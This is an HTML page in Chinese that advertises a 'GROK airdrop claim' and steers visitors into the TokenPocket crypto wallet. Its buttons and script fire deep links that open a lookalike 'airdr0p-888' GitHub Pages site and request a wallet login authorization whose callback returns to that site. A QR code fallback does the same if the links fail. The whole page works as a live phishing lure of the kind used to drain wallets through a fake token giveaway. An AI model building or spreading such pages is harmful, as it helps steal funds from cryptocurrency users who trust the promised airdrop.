<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GROK 空投领取</title>
</head>
<body>

<h2>GROK 空投领取</h2>

<!-- 主按钮：tpdapp 打开网页（BSC） -->
<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22BSC%22%2C%22source%22%3A%22web%22%7D' 
   style="display: inline-block; padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
  GROK 空投领取
</a>

<br/>

<!-- 备用按钮：tpoutside 授权 + BSC 回调 -->
<a href='tpoutside://pull.activity?param=%7B%22action%22%3A%22login%22%2C%22actionId%22%3A%22unique-id-2025%22%2C%22blockchains%22%3A%5B%7B%22chainId%22%3A%2256%22%2C%22network%22%3A%22bsc%22%7D%5D%2C%22dappName%22%3A%22MyDApp%22%2C%22protocol%22%3A%22TokenPocket%22%2C%22version%22%3A%222.0%22%2C%22callbackUrl%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%7D' 
   style="display: inline-block; padding:15px 30px; font-size:18px; background:#28a745; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
  
</a>

<!-- JS 增强版按钮（自动 fallback） -->
<button onclick="openTPWithFallback()" style="padding:15px 30px; font-size:18px; background:#6f42c1; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
  
</button>

<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
  <p>如果失败，用 TP 钱包扫码打开：</p>
  <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
</div>

<script>
const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";

function isTPBrowser() {
  const ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
}

function showQRCode(url) {
  const qr = document.getElementById('qrcode');
  const img = document.getElementById('qrcode-img');
  if (!qr || !img) return;
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
  qr.style.display = 'block';
}

function openTPWithFallback() {
  if (isTPBrowser()) {
    location.href = TARGET_URL;
    return;
  }

  // 方案1: tpdapp 打开网页（BSC）
  const params1 = { url: TARGET_URL, chain: "BSC", source: "web" };
  const encodedParams1 = encodeURIComponent(JSON.stringify(params1));
  const scheme1 = `tpdapp://open?params=${encodedParams1}`;
  window.location.href = scheme1;

  // 方案2: 300ms 后 tpoutside 授权 + BSC 回调
  setTimeout(() => {
    const params2 = {
      action: "login",
      actionId: Date.now().toString(),
      blockchains: [{ chainId: "56", network: "bsc" }],
      dappName: "MyDApp",
      protocol: "TokenPocket",
      version: "2.0",
      callbackUrl: TARGET_URL
    };
    const encodedParams2 = encodeURIComponent(JSON.stringify(params2));
    const scheme2 = `tpoutside://pull.activity?param=${encodedParams2}`;
    window.location.href = scheme2;
  }, 300);

  // 兜底: 3.5s 后显示二维码
  setTimeout(() => showQRCode(TARGET_URL), 3500);
}
</script>

</body>
</html>
